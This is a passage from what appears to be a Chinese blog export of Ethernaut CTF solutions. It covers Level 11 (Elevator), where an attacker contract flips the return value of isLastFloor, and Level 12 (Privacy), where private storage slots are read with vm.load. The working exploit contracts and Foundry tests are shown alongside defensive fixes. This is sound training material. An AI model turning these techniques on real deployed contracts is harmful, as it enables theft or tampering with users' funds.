class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SecureElevator &#123;</span><br><span class=\"line\">    mapping(address =&gt; bool) public approvedBuildings;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyApprovedBuilding() &#123;</span><br><span class=\"line\">        require(approvedBuildings[msg.sender], &quot;Unauthorized building&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function addApprovedBuilding(address building) public &#123;</span><br><span class=\"line\">        require(msg.sender == owner);</span><br><span class=\"line\">        approvedBuildings[building] = true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function goTo(uint _floor) public onlyApprovedBuilding &#123;</span><br><span class=\"line\">        // 安全逻辑</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-实现内部逻辑\"><a href=\"#4-实现内部逻辑\" class=\"headerlink\" title=\"4. 实现内部逻辑\"></a>4. 实现内部逻辑</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SecureElevator &#123;</span><br><span class=\"line\">    uint public floor;</span><br><span class=\"line\">    bool public top;</span><br><span class=\"line\">    uint public topFloor = 10;  // 定义最高层</span><br><span class=\"line\">    </span><br><span class=\"line\">    function goTo(uint _floor) public &#123;</span><br><span class=\"line\">        require(_floor &lt;= topFloor, &quot;Floor too high&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        floor = _floor;</span><br><span class=\"line\">        top = (_floor == topFloor);  // 内部判断逻辑</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><h3 id=\"接口安全检测\"><a href=\"#接口安全检测\" class=\"headerlink\" title=\"接口安全检测\"></a>接口安全检测</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 检测接口实现的一致性</span><br><span class=\"line\">contract InterfaceChecker &#123;</span><br><span class=\"line\">    function checkConsistency(address building, uint floor) public &#123;</span><br><span class=\"line\">        Building b = Building(building);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 多次调用检查一致性</span><br><span class=\"line\">        bool result1 = b.isLastFloor(floor);</span><br><span class=\"line\">        bool result2 = b.isLastFloor(floor);</span><br><span class=\"line\">        </span><br><span class=\"line\">        require(result1 == result2, &quot;Inconsistent interface implementation&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"合约分析工具\"><a href=\"#合约分析工具\" class=\"headerlink\" title=\"合约分析工具\"></a>合约分析工具</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 使用 Slither 检测接口安全问题</span></span><br><span class=\"line\">slither . --detect external-function</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用 Mythril 分析</span></span><br><span class=\"line\">Myth analyze &lt;contract.sol&gt; --execution-timeout 60</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li>接口是一种无需知道实现细节就可以与其他合约交互的方式</li>\n<li>但永远不要盲目相信它们！</li>\n<li>多次调用外部函数可能产生不一致的结果</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>实现恶意的接口逻辑</li>\n<li>利用多次调用之间的状态变化</li>\n<li>操纵函数返回值以达到攻击目的</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>只调用一次外部函数并缓存结果</li>\n<li>使用 <code>view</code> 函数修饰符防止状态改变</li>\n<li>实现白名单机制控制访问</li>\n<li>尽可能使用内部逻辑而不依赖外部实现</li>\n</ul>\n","more":"<h1 id=\"🎯-Ethernaut-Level-11-Elevator-接口实现攻击\"><a href=\"#🎯-Ethernaut-Level-11-Elevator-接口实现攻击\" class=\"headerlink\" title=\"🎯 Ethernaut Level 11: Elevator - 接口实现攻击\"></a>🎯 Ethernaut Level 11: Elevator - 接口实现攻击</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/11\">Ethernaut Level 11 - Elevator</a><br><strong>攻击类型</strong>: 接口实现攻击<br><strong>难度</strong>: ⭐⭐⭐☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>目的是使电梯达到最顶层，即使题目合约的 <code>top</code> 为 <code>true</code>。关键在于理解接口定义与实际实现的差别，以及如何利用这个差别进行攻击。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel11.svg\" alt=\"Elevator Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><h3 id=\"接口的安全风险\"><a href=\"#接口的安全风险\" class=\"headerlink\" title=\"接口的安全风险\"></a>接口的安全风险</h3><p>本关卡重在考验我们对智能合约接口的认知程度：</p>\n<ul>\n<li><strong>接口定义函数签名，但不定义它们的逻辑</strong></li>\n<li>这是一种无需知道实现细节就可以与其他合约交互的方法</li>\n<li>但也意味着攻击者可以控制接口的实现逻辑</li>\n</ul>\n<h3 id=\"关键漏洞代码\"><a href=\"#关键漏洞代码\" class=\"headerlink\" title=\"关键漏洞代码\"></a>关键漏洞代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function goTo(uint _floor) public &#123;</span><br><span class=\"line\">    Building building = Building(msg.sender);</span><br><span class=\"line\"></span><br><span class=\"line\">    if (!building.isLastFloor(_floor)) &#123;</span><br><span class=\"line\">      floor = _floor;</span><br><span class=\"line\">      top = building.isLastFloor(floor);  // 第二次调用！</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"攻击向量\"><a href=\"#攻击向量\" class=\"headerlink\" title=\"攻击向量\"></a>攻击向量</h3><p>在 <code>goTo</code> 函数中，<code>isLastFloor</code> 被调用两次：</p>\n<ol>\n<li><strong>第一次调用</strong>：必须返回 <code>false</code>，否则无法进入修改 <code>top</code> 的逻辑</li>\n<li><strong>第二次调用</strong>：我们可以让它返回 <code>true</code> 来设置 <code>top = true</code></li>\n</ol>\n<p>我们可以通过创建一个 <code>isLastFloor()</code> 来利用这一点，它将第一次返回 <code>false</code>，第二次返回 <code>true</code>。</p>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Ethernaut.sol&quot;;</span><br><span class=\"line\">import &quot;../src/levels/ElevatorFactory.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">interface Building &#123;</span><br><span class=\"line\">    function isLastFloor(uint) external returns (bool);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ElevatorAttacker is Building &#123;</span><br><span class=\"line\">    Elevator instance;</span><br><span class=\"line\">    bool top = false;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _elevator) &#123;</span><br><span class=\"line\">        instance = Elevator(_elevator);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 关键：状态变化的接口实现</span><br><span class=\"line\">    function isLastFloor(uint _floor) external override returns (bool) &#123;</span><br><span class=\"line\">        top = !top;  // 第一次调用时 top 变为 true，第二次变为 false</span><br><span class=\"line\">        return !top; // 第一次返回 false，第二次返回 true</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function attack(uint _floor) public &#123;</span><br><span class=\"line\">        instance.goTo(_floor);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ElevatorTest is Test &#123;</span><br><span class=\"line\">    Ethernaut ethernaut;</span><br><span class=\"line\">    ElevatorFactory elevatorFactory;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        ethernaut = new Ethernaut();</span><br><span class=\"line\">        elevatorFactory = new ElevatorFactory();</span><br><span class=\"line\">        ethernaut.registerLevel(elevatorFactory);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testElevatorExploit() public &#123;</span><br><span class=\"line\">        // 创建关卡实例</span><br><span class=\"line\">        address levelInstance = ethernaut.createLevelInstance(elevatorFactory);</span><br><span class=\"line\">        Elevator instance = Elevator(levelInstance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 检查初始状态</span><br><span class=\"line\">        assertEq(instance.top(), false);</span><br><span class=\"line\">        assertEq(instance.floor(), 0);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 部署攻击合约</span><br><span class=\"line\">        ElevatorAttacker attacker = new ElevatorAttacker(levelInstance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 执行攻击</span><br><span class=\"line\">        attacker.attack(1);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证攻击成功</span><br><span class=\"line\">        assertEq(instance.top(), true);</span><br><span class=\"line\">        assertEq(instance.floor(), 1);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 提交关卡</span><br><span class=\"line\">        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(</span><br><span class=\"line\">            payable(levelInstance)</span><br><span class=\"line\">        );</span><br><span class=\"line\">        assert(levelSuccessfullyPassed);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>实现 Building 接口</strong>：创建一个合约实现 <code>Building</code> 接口</li>\n<li><strong>状态变化逻辑</strong>：在 <code>isLastFloor()</code> 中实现状态变化</li>\n<li><strong>调用 goTo 函数</strong>：通过攻击合约调用 <code>goTo()</code></li>\n<li><strong>验证结果</strong>：检查 <code>top</code> 是否为 <code>true</code></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 状态变化的关键实现</span><br><span class=\"line\">function isLastFloor(uint _floor) external override returns (bool) &#123;</span><br><span class=\"line\">    top = !top;  // 切换状态</span><br><span class=\"line\">    return !top; // 第一次返回 false，第二次返回 true</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><h3 id=\"1-避免多次调用外部函数\"><a href=\"#1-避免多次调用外部函数\" class=\"headerlink\" title=\"1. 避免多次调用外部函数\"></a>1. 避免多次调用外部函数</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌ 不安全：多次调用外部函数</span><br><span class=\"line\">contract VulnerableElevator &#123;</span><br><span class=\"line\">    function goTo(uint _floor) public &#123;</span><br><span class=\"line\">        Building building = Building(msg.sender);</span><br><span class=\"line\">        </span><br><span class=\"line\">        if (!building.isLastFloor(_floor)) &#123;  // 第一次调用</span><br><span class=\"line\">            floor = _floor;</span><br><span class=\"line\">            top = building.isLastFloor(floor);  // 第二次调用！</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 安全：只调用一次并缓存结果</span><br><span class=\"line\">contract SecureElevator &#123;</span><br><span class=\"line\">    function goTo(uint _floor) public &#123;</span><br><span class=\"line\">        Building building = Building(msg.sender);</span><br><span class=\"line\">        </span><br><span class=\"line\">        bool isLast = building.isLastFloor(_floor);  // 只调用一次</span><br><span class=\"line\">        </span><br><span class=\"line\">        if (!isLast) &#123;</span><br><span class=\"line\">            floor = _floor;</span><br><span class=\"line\">            top = isLast;  // 使用缓存的结果</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-使用-view-函数\"><a href=\"#2-使用-view-函数\" class=\"headerlink\" title=\"2. 使用 view 函数\"></a>2. 使用 view 函数</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ✅ 使用 view 函数防止状态改变</span><br><span class=\"line\">interface Building &#123;</span><br><span class=\"line\">    function isLastFloor(uint) external view returns (bool);  // view 修饰符</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SecureElevator &#123;</span><br><span class=\"line\">    function goTo(uint _floor) public &#123;</span><br><span class=\"line\">        Building building = Building(msg.sender);</span><br><span class=\"line\">        </span><br><span class=\"line\">        if (!building.isLastFloor(_floor)) &#123;</span><br><span class=\"line\">            floor = _floor;</span><br><span class=\"line\">            top = building.isLastFloor(floor);  // view 函数保证一致性</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-使用白名单机制\"><a href=\"#3-使用白名单机制\" class=\"headerlink\" title=\"3. 使用白名单机制\"></a>3. 使用白名单机制</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SecureElevator &#123;</span><br><span class=\"line\">    mapping(address =&gt; bool) public approvedBuildings;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyApprovedBuilding() &#123;</span><br><span class=\"line\">        require(approvedBuildings[msg.sender], &quot;Unauthorized building&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function addApprovedBuilding(address building) public &#123;</span><br><span class=\"line\">        require(msg.sender == owner);</span><br><span class=\"line\">        approvedBuildings[building] = true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function goTo(uint _floor) public onlyApprovedBuilding &#123;</span><br><span class=\"line\">        // 安全逻辑</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-实现内部逻辑\"><a href=\"#4-实现内部逻辑\" class=\"headerlink\" title=\"4. 实现内部逻辑\"></a>4. 实现内部逻辑</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SecureElevator &#123;</span><br><span class=\"line\">    uint public floor;</span><br><span class=\"line\">    bool public top;</span><br><span class=\"line\">    uint public topFloor = 10;  // 定义最高层</span><br><span class=\"line\">    </span><br><span class=\"line\">    function goTo(uint _floor) public &#123;</span><br><span class=\"line\">        require(_floor &lt;= topFloor, &quot;Floor too high&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        floor = _floor;</span><br><span class=\"line\">        top = (_floor == topFloor);  // 内部判断逻辑</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><h3 id=\"接口安全检测\"><a href=\"#接口安全检测\" class=\"headerlink\" title=\"接口安全检测\"></a>接口安全检测</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 检测接口实现的一致性</span><br><span class=\"line\">contract InterfaceChecker &#123;</span><br><span class=\"line\">    function checkConsistency(address building, uint floor) public &#123;</span><br><span class=\"line\">        Building b = Building(building);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 多次调用检查一致性</span><br><span class=\"line\">        bool result1 = b.isLastFloor(floor);</span><br><span class=\"line\">        bool result2 = b.isLastFloor(floor);</span><br><span class=\"line\">        </span><br><span class=\"line\">        require(result1 == result2, &quot;Inconsistent interface implementation&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"合约分析工具\"><a href=\"#合约分析工具\" class=\"headerlink\" title=\"合约分析工具\"></a>合约分析工具</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 使用 Slither 检测接口安全问题</span></span><br><span class=\"line\">slither . --detect external-function</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用 Mythril 分析</span></span><br><span class=\"line\">Myth analyze &lt;contract.sol&gt; --execution-timeout 60</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li>接口是一种无需知道实现细节就可以与其他合约交互的方式</li>\n<li>但永远不要盲目相信它们！</li>\n<li>多次调用外部函数可能产生不一致的结果</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>实现恶意的接口逻辑</li>\n<li>利用多次调用之间的状态变化</li>\n<li>操纵函数返回值以达到攻击目的</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>只调用一次外部函数并缓存结果</li>\n<li>使用 <code>view</code> 函数修饰符防止状态改变</li>\n<li>实现白名单机制控制访问</li>\n<li>尽可能使用内部逻辑而不依赖外部实现</li>\n</ul>\n"},{"title":"Ethernaut Level 12: Privacy - 存储布局分析","date":"2025-01-25T08:00:00.000Z","updated":"2025-01-25T08:00:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"深入学习 EVM 存储布局和复杂数据结构的存储机制，掌握 Privacy 关卡的攻击技术。理解静态数组、数据打包和存储槽位计算。","_content":"\n# 🎯 Ethernaut Level 12: Privacy - 存储布局分析\n\n> **关卡链接**: [Ethernaut Level 12 - Privacy](https://ethernaut.openzeppelin.com/level/12)  \n> **攻击类型**: 存储布局分析  \n> **难度**: ⭐⭐⭐⭐☆\n\n## 📋 挑战目标\n\n要读取 `private` 数据，然后调用 `unlock` 函数。这个关卡进一步考验对 EVM 存储布局的理解，特别是静态数组和数据打包的处理。\n\n![Privacy Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel12.svg)\n\n## 🔍 漏洞分析\n\n### 目标函数分析\n\n```solidity\nfunction unlock(bytes16 _key) public {\n    require(_key == bytes16(data[2]));  // 需要 data[2] 的 bytes16 版本\n    locked = false;\n}\n```\n\n我们可以看到，此处的条件是 `_key` 必须等于 `bytes16(data[2])`。那么我们如何访问 `data[2]` 呢？\n\n### 复杂存储布局分析\n\n合约的状态变量：\n\n```solidity\nbool public locked = true;\nuint256 public ID = block.timestamp;\nuint8 private flattening = 10;\nuint8 private denomination = 255;\nuint16 private awkwardness = uint16(block.timestamp);\nbytes32[3] private data;\n```\n\n由于没有继承，存储从 slot 0 开始，带有 `locked` 变量，如下所示：\n\n| Slot | Variable | Type | Size | Notes |\n|------|----------|------|------|-------|\n| 0 | `locked` | `bool` | 1 byte | `locked` 占用1个字节，但由于下一个值不适合剩下的31个字节，`locked` 占用了整个插槽 |\n| 1 | `ID` | `uint256` | 32 bytes | `uint256` 占用32字节，所以是1个满槽 |\n| 2 | `flattening`<br/>`denomination`<br/>`awkwardness` | `uint8`<br/>`uint8`<br/>`uint16` | 1+1+2 bytes | 分别是1个字节+1个字节+2个字节，Solidity将它们打包到一个插槽中 |\n| 3 | `data[0]` | `bytes32` | 32 bytes | 静态数组启动一个新的存储槽，每个 `bytes32` 元素占用一个完整的槽 |\n| 4 | `data[1]` | `bytes32` | 32 bytes | |\n| 5 | `data[2]` | `bytes32` | 32 bytes | **这个槽位就是 `data[2]`** |\n\n通过这个详细的存储布局，我们可以看到 `data[2]` 存储在 slot 5 中。\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Ethernaut.sol\";\nimport \"../src/levels/PrivacyFactory.sol\";\n\ncontract PrivacyTest is Test {\n    Ethernaut ethernaut;\n    PrivacyFactory privacyFactory;\n    \n    function setUp() public {\n        ethernaut = new Ethernaut();\n        privacyFactory = new PrivacyFactory();\n        ethernaut.registerLevel(privacyFactory);\n    }\n    \n    function testPrivacyExploit() public {\n        // 创建关卡实例\n        address levelInstance = ethernaut.createLevelInstance(privacyFactory);\n        Privacy instance = Privacy(levelInstance);\n        \n        // 验证初始状态\n        assertEq(instance.locked(), true);\n        \n        // 攻击：读取 slot 5 中的 data[2]\n        bytes32 data2 = vm.load(address(instance), bytes32(uint256(5)));\n        \n        // 转换为 bytes16 并解锁\n        bytes16 key = bytes16(data2);\n        instance.unlock(key);\n        \n        // 验证攻击成功\n        assertEq(instance.locked(), false);\n        \n        // 提交关卡\n        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(\n            payable(levelInstance)\n        );\n        assert(levelSuccessfullyPassed);\n    }\n    \n    // 额外测试：验证存储布局\n    function testStorageLayout() public {\n        address levelInstance = ethernaut.createLevelInstance(privacyFactory);\n        \n        // 检查各个 slot 的内容\n        bytes32 slot0 = vm.load(address(levelInstance), bytes32(uint256(0))); // locked\n        bytes32 slot1 = vm.load(address(levelInstance), bytes32(uint256(1))); // ID\n        bytes32 slot2 = vm.load(address(levelInstance), bytes32(uint256(2))); // packed variables\n        bytes32 slot3 = vm.load(address(levelInstance), bytes32(uint256(3))); // data[0]\n        bytes32 slot4 = vm.load(address(levelInstance), bytes32(uint256(4))); // data[1]\n        bytes32 slot5 = vm.load(address(levelInstance), bytes32(uint256(5))); // data[2]\n        \n        console.log(\"Slot 0 (locked):\", uint256(slot0));\n        console.log(\"Slot 1 (ID):\", uint256(slot1));\n        console.log(\"Slot 2 (packed):\");\n        console.logBytes32(slot2);\n        console.log(\"Slot 3 (data[0]):\");\n        console.logBytes32(slot3);\n        console.log(\"Slot 4 (data[1]):\");\n        console.logBytes32(slot4);\n        console.log(\"Slot 5 (data[2]):\");\n        console.logBytes32(slot5);\n    }\n}\n```\n\n### 关键攻击步骤\n\n1. **分析存储布局**：确定 `data[2]` 存储在 slot 5\n2. **读取存储**：使用 `vm.load()` 读取 slot 5 的数据\n3. **数据转换**：将 `bytes32` 转换为 `bytes16`\n4. **调用 unlock**：使用转换后的 key 解锁合约\n\n```solidity\n// 读取 slot 5 中的 data[2]\nbytes32 data2 = vm.load(address(instance), bytes32(uint256(5)));\n\n// 转换为 bytes16\nbytes16 key = bytes16(data2);  // 取前16个字节\n\n// 解锁合约\ninstance.unlock(key);\n```\n\n## 🛡️ 防御措施\n\n### 1. 不要在链上存储敏感数据\n\n```solidity\n// ❌ 不安全：私有数据存储在链上\ncontract VulnerableContract {\n    bytes32[3] private secretData;  // 仍然可以被读取！\n    